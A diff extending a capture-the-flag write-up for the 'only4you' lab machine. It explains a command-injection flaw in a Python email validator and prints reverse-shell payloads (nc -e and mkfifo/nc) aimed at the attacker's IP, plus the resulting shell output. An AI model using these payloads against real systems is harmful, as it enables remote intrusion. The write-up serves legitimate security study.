@@ -186,3 +186,57 @@ def index():
 ...
 ```
 This seems to be what controls that email form previously seen, i also attempted to see if this `form` import is also locally included in this directory. `/var/www/only4you.htb/form.py`
+
+I will attempt to only show the relevant code lines here.
+```
+def issecure(email, ip):
+	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+		return 0
+    else:
+        domain = email.split("@", 1)[1]
+        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+        output = result.stdout.decode('utf-8')
+        if "v=spf1" not in output:
+            return 1
+        else:
+        domains = []
+        ips = []
+        if "include:" in output:
+            dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+            dms.pop(0)
+            for domain in dms:
+                domains.append(domain)
+            while True:
+                for domain in domains:
+                    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+```
+This starts by checking our provided email against this regex, it then takes the domain by splitting the email by the @ symbol and taking the 1st (2nd) var in the list.
+
+However this implementation is flawed, the regex can be bypassed to provide an IP address instead of a domain by including a seperate `@` symbol.
+
+e.g. `test@10.10.14.77@google.com` will pass the regex AND the code will assign domain = 10.10.11.1
+
+So as we can provide a controlled ip as the "domain" which the system will use the `dig` command against to get a txt record from it. It will then take the output, as long as the output includes `v=spf1` the code will then look for instances of `include:`, seperate them into a list and remove the first with `pop(0)`. It will then run dig again against the list objects.
+
+The problem with this is again the regex does not hold up to more testing, if the output is multiple `include:`, as long as one of them contains a domain suffix the whole is treated legitmately.
+
+e.g. `include: teehee include: ; echo 'PWND' include:.ds`
+
+So as we can see there is an oppurtunity for RCE due to the usage of `subprocess.run()` in this python script. 
+
+To test this vulnerability, i create a fakedns server which will respond to txt queries with: `include: test include: ; nc -e /bin/sh 10.10.14.77 4444`
+
+While exploiting this i found that the secondary exploit of setting up a dns server wasn't needed, the first dig command can be exploited by simply adding a `;` after the domain and then a command straight after.
+
+e.g. `&email=test@google.com; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 4444 >/tmp/f`
+
+## Initial Access: www-data
+
+```
+Connection received on 10.10.11.210 58992
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
+```
+
